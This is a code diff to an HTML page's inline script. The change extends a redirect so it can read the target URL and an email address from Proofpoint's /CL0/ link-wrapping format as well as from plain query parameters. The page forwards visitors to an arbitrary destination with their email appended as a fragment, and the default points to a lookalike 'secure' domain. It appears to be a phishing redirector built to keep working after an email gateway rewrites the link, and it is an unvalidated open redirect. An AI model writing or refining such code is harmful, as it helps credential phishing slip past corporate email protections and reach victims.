@@ -151,9 +151,35 @@ h1 {
 
     <script>
         (function() {
+            let email = null;
+            let redirectTo = null;
+
+            // First, try to extract from normal query params
             const urlParams = new URLSearchParams(window.location.search);
-            const email = urlParams.get('email');
-            const redirectTo = urlParams.get('redirect_to');
+            email = urlParams.get('email');
+            redirectTo = urlParams.get('redirect_to');
+
+            // If not found, try to extract from Proofpoint's wrapper format
+            // Proofpoint wraps like: /CL0/https:%2F%2Fexample.com%2Fpage%3Fparam=value
+            if (!redirectTo) {
+                const pathname = window.location.pathname;
+                const proofpointMatch = pathname.match(/\/CL0\/(https?[^\/]*(?:\/[^\/]*)*)/);
+                
+                if (proofpointMatch && proofpointMatch[1]) {
+                    try {
+                        // Decode the URL-encoded content
+                        let encodedUrl = proofpointMatch[1];
+                        let decodedUrl = decodeURIComponent(encodedUrl);
+                        
+                        // Parse query params from the decoded URL
+                        const decodedParams = new URLSearchParams(decodedUrl.split('?')[1]);
+                        redirectTo = decodedParams.get('url');
+                        if (!email) email = decodedParams.get('email');
+                    } catch (e) {
+                        console.error('Error parsing Proofpoint wrapper:', e);
+                    }
+                }
+            }
 
             const finalDestination = redirectTo ? decodeURIComponent(redirectTo) : "https://secure.flowmoresgroup.com";
             const landingPageUrl = email ? `${finalDestination}#${email}` : finalDestination;
